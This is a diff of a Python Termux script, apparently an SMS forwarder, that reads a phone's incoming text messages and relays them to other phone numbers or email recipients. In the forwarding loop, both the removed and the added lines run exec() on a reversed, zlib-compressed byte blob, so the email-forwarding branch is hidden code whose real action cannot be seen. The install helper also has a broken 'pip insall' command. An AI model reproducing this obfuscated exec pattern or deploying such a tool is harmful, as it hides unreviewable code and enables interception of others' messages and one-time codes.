-                    if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf0"\xb3h\x00M|\x92\xf9 \x95)\xf9I\x15p\xea)\x99)\x89\xa9E\x19%\xea\xf8\xc1)\x16\xa5&\xe6\x95\xe7\xc9\x85\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IHQ\xd2S\xc9\xf0.+6(\x084KrP\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
-                    else: SendNumber(to, data["body"])
-                ID += SmsID
-        else: SMSLBAR()
+    try:
+        global ID
+        details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
+        for data in details:
+            SmsID = data["_id"]
+            if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
+                SmsID = str(SmsID)
+                if (re.search(SmsID, ID)) : SMSLBAR()
+                else:
+                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
+                    subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
+                    for to in TO:
+                        if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf0"\xb3h\x00M|\x92\xf9 \x95)\xf9I\x15p\xea)\x99)\x89\xa9E\x19%\xea\xf8\xc1)\x16\xa5&\xe6\x95\xe7\xc9\x85\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IHQ\xd2S\xc9\xf0.+6(\x084KrP\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
+                        else: SendNumber(to, data["body"])
+                    ID += SmsID
+            else: SMSLBAR()
+    except KeyboardInterrupt: EXIT(False)
+    except json.decoder.JSONDecodeError :
+        finaltxt=""
+        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
+        sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def SMSLBAR():
     finaltxt=""
     for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
     sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Waiting For New Messages...")
+
 def Installer():
-    def install(*args):
-        for i in args: subprocess.getoutput("pip insall "+i)
-    UNIMPORTED = []
-    try: import requests
-    except: UNIMPORTED.append("requests")
-    try: import random
-    except: UNIMPORTED.append("random")
-    try: import smtplib
-    except: UNIMPORTED.append("secure-smtplib")
-    if not (len(UNIMPORTED) == 0):
-        Banner()
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║ {yellow}SOME DEPENDENCIES COULD NOT BE INSTALLED {red}║", 15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        INSTALL = threading.Thread(target=install, args=(UNIMPORTED))
-        INSTALL.start()
-        while INSTALL.is_alive(): AnimLOAD(f" {yellow}Installing Building Dependencies...{white}", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
-        INSTALL.join()
-    if not (termux_api):
-        apk_release = subprocess.getoutput("timeout 5 echo $TERMUX_APK_RELEASE")
-        Banner()
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║        {white}Termux-API Not Installed {blue}!        {red}║", 20)
-        center(f"{red}╠══════════════════════════════════════════╣", 5)
-        center(Box(yellow+"Install Termux-API From "+apk_release, "║", " ", red+" ║", 49, "center", resultprint=False), 10)
-        center(f"{red}║             {yellow}And try again {white}!              {red}║", 20)
-        center(f"{red}║         {yellow}Dont worry its secure :)         {red}║", 15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        print()
-        exit()
-    else:
+    try:
+        def install(*args):
+            for i in args: subprocess.getoutput("pip insall "+i)
+        UNIMPORTED = []
+        try: import requests
+        except: UNIMPORTED.append("requests")
+        try: import random
+        except: UNIMPORTED.append("random")
+        try: import smtplib
+        except: UNIMPORTED.append("secure-smtplib")
         if not (len(UNIMPORTED) == 0):
             Banner()
             center(f"{red}╔══════════════════════════════════════════╗", 5)
-            center(f"{red}║         {yellow}Installtion Completed {white}!          {red}║", 20)
+            center(f"{red}║ {yellow}SOME DEPENDENCIES COULD NOT BE INSTALLED {red}║", 15)
             center(f"{red}╚══════════════════════════════════════════╝", 5)
+            INSTALL = threading.Thread(target=install, args=(UNIMPORTED))
+            INSTALL.start()
+            while INSTALL.is_alive(): AnimLOAD(f" {yellow}Installing Building Dependencies...{white}", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
+            INSTALL.join()
+        if not (termux_api):
+            apk_release = subprocess.getoutput("timeout 5 echo $TERMUX_APK_RELEASE")
+            if not (apk_release): apk_release = "F-Droid"
+            Banner()
             center(f"{red}╔══════════════════════════════════════════╗", 5)
-            center(f"{red}║         {white}Startig SMS_Forwarder...         {red}║", 15)
+            center(f"{red}║        {white}Termux-API Not Installed {blue}!        {red}║", 20)
+            center(f"{red}╠══════════════════════════════════════════╣", 5)
+            center(Box(yellow+"Install Termux-API From "+apk_release, "║", " ", red+" ║", 49, "center", resultprint=False), 10)
+            center(f"{red}║             {yellow}And try again {white}!              {red}║", 20)
+            center(f"{red}║         {yellow}Dont worry its secure :)         {red}║", 15)
             center(f"{red}╚══════════════════════════════════════════╝", 5)
-            finaltxt=""
-            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
-            sys.stdout.write("\r"+finaltxt)
-            sleep(2), clear()
-            os.system("python "+str(sys.argv[0]))
-        else: MENU()
+            print()
+            exit()
+        else:
+            if not (len(UNIMPORTED) == 0):
+                Banner()
+                center(f"{red}╔══════════════════════════════════════════╗", 5)
+                center(f"{red}║         {yellow}Installtion Completed {white}!          {red}║", 20)
+                center(f"{red}╚══════════════════════════════════════════╝", 5)
+                center(f"{red}╔══════════════════════════════════════════╗", 5)
+                center(f"{red}║         {white}Startig SMS_Forwarder...         {red}║", 15)
+                center(f"{red}╚══════════════════════════════════════════╝", 5)
+                finaltxt=""
+                for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
+                sys.stdout.write("\r"+finaltxt)
+                sleep(2), clear()
+                os.system("python ~/SMS_Forwarder/sms_forwarder.py")
+            else: MENU()
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def EmailMenu():
     try:
@@ -492,33 +529,37 @@ def EmailMenu():
             sys.stdout.write("\r"+finaltxt)
             while True: SendSMS(Filter, True)
     except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def PHMenu():
-    Banner()
-    center(f"{red}╔══════════════════════════════════════════╗", 5)
-    center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
-    center(f"╠══════════════════════════════════════════╝")
-    center(f"║{Space(42)}")
-    Input = INPUT("╚════► ")
-    Numbers = Input.split(",")
-    Filter = []
-    for number in Numbers:
-        if (number == ""): continue
-        else: Filter.append(number)
-    if (len(Filter) == 0): PHMenu()
-    else:
+    try:
         Banner()
         center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        center(f"{red}╔══════════════════════════════════════════╗", 5)
-        center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
-        center(f"{red}╚══════════════════════════════════════════╝", 5)
-        print(yellow)
-        finaltxt=""
-        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
-        sys.stdout.write("\r"+finaltxt)
-        while True: SendSMS(Filter, False)
+        center(f"{red}║  {blue}Enter mobile numbers separated by '{green},{blue}'   {red}║", 25)
+        center(f"╠══════════════════════════════════════════╝")
+        center(f"║{Space(42)}")
+        Input = INPUT("╚════► ")
+        Numbers = Input.split(",")
+        Filter = []
+        for number in Numbers:
+            if (number == ""): continue
+            else: Filter.append(number)
+        if (len(Filter) == 0): PHMenu()
+        else:
+            Banner()
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(Box(f"{white}Forwarding SMS To "+str(len(Filter))+" Phone Numbers", red+"║   ", " ", red+"  ║", 44, "center", resultprint=False), 15)
+            center(f"{red}╚══════════════════════════════════════════╝", 5)
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(f"{red}║       {white}For stop press ( {magenta}ctrl + c {white})        {red}║", 25)
+            center(f"{red}╚══════════════════════════════════════════╝", 5)
+            print(yellow)
+            finaltxt=""
+            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
+            sys.stdout.write("\r"+finaltxt)
+            while True: SendSMS(Filter, False)
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def MENU():
     try:
@@ -553,10 +594,10 @@ def MENU():
             sleep(2)
             MENU()
     except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
-if not (termux_api()): Installer()
-else:
-    if (Internet()): CheckVersion()
-    if not (cmd()): MENU()
-
-
+if (__name__ == "__main__"):
+    if not (termux_api()): Installer()
+    else:
+        if (Internet()): print(f"{yellow}Checking Updates..."), CheckVersion()
+        if not (cmd()): MENU()
